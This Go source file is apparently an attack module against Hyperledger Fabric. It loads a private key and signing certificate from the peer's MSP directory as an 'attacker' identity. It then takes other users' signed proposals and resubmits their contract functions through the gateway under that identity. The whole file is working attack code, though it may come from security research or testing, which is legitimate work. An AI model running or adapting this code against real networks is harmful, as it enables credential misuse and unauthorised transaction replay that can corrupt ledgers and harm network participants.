package attack

import (
	"fmt"
	"io/ioutil"
	"path/filepath"

	"github.com/golang/protobuf/proto"
	m "github.com/hyperledger/fabric-protos-go/msp"
	pb "github.com/hyperledger/fabric-protos-go/peer"
	"github.com/hyperledger/fabric-sdk-go/pkg/core/config"
	"github.com/hyperledger/fabric-sdk-go/pkg/gateway"
	"github.com/hyperledger/fabric/common/flogging"
	"github.com/hyperledger/fabric/msp"
)

var logger = flogging.MustGetLogger("attack")
var attackUser = "attacker"
var identity *gateway.X509Identity
var userDir = "/etc/hyperledger/fabric/msp/user/msp"
var mspDir = "/etc/hyperledger/fabric/msp"

type Attack interface {
	Prepare() error
	GetInfo() *map[string]string
	LaunchAttack(*pb.SignedProposal) error
}

type Attacker struct {
	PackageInfo map[string]string
	wallet      *gateway.Wallet
	LocalMsp    msp.IdentityDeserializer
}

func (a *Attacker) Prepare() error {
	defer func() {
		logger.Infof("")
	}()
	a.wallet = gateway.NewInMemoryWallet()
	defer func() {
		logger.Infof("%v exists: %v", attackUser, a.wallet.Exists(attackUser))
	}()
	keyDir := filepath.Join(userDir, "keystore")
	key, err := ReadOneFileFromDir(keyDir)
	if err != nil {
		return err
	}
	signCertDir := filepath.Join(userDir, "signcerts")
	cert, err := ReadOneFileFromDir(signCertDir)
	if err != nil {
		return err
	}
	identity = gateway.NewX509Identity("Org1MSP", string(cert), string(key))
	return a.wallet.Put(attackUser, identity)
}

func ReadOneFileFromDir(dir string) ([]byte, error) {
	files, err := ioutil.ReadDir(dir)
	if len(files) != 1 {
		return nil, fmt.Errorf("file != 1")
	}
	if err != nil {
		return nil, err
	}
	content, err := ioutil.ReadFile(filepath.Join(dir, files[0].Name()))
	if err != nil {
		return nil, err
	}
	return content, nil
}

func (a *Attacker) GetInfo() *map[string]string {
	return &a.PackageInfo
}

func (a *Attacker) LaunchAttack(signedProp *pb.SignedProposal) error {
	if identity == nil {
		return fmt.Errorf("identity is empty.")
	}
	up, err := parse(signedProp)
	if err != nil {
		return err
	}
	// logger.Infof("\nzxyCert: %s\n", identity.Credentials.Certificate)
	// logger.Infof("\nzxyCreator: %s\n", string(up.Creator))

	sid := &m.SerializedIdentity{}
	err = proto.Unmarshal(up.Creator, sid)
	// logger.Infof("\nzxySid: %s\n", string(sid.IdBytes))
	if err != nil {
		return err
	}
	// bl, _ := pem.Decode(sid.IdBytes)
	// if bl == nil {
	// 	return fmt.Errorf("pem structure unknown")
	// }
	// cert, err := x509.ParseCertificate(bl.Bytes)
	// if err != nil {
	// 	return err
	// }
	// logger.Infof("\nzxyDecodedCert: %+v\n", cert)
	if identity.Credentials.Certificate == string(sid.IdBytes) {
		return nil
	}
	logger.Infof("Channel: %v, Contract: %v, Function: %v, Args: %v", up.Channel, up.Contract, up.Function, up.Args)
	if err != nil {
		return err
	}
	gw, err := gateway.Connect(
		gateway.WithConfig(config.FromFile(filepath.Join(mspDir, "connection-org1.json"))),
		gateway.WithIdentity(a.wallet, attackUser),
	)
	if err != nil {
		return err
	}
	defer gw.Close()

	network, err := gw.GetNetwork(up.Channel)
	if err != nil {
		return err
	}

	contract := network.GetContract(up.Contract)

	transaction, _ := contract.CreateTransaction(up.Function)

	result, err := transaction.Submit()
	if err != nil {
		return err
	}
	logger.Infof("attack result: %v", result)

	return nil
}
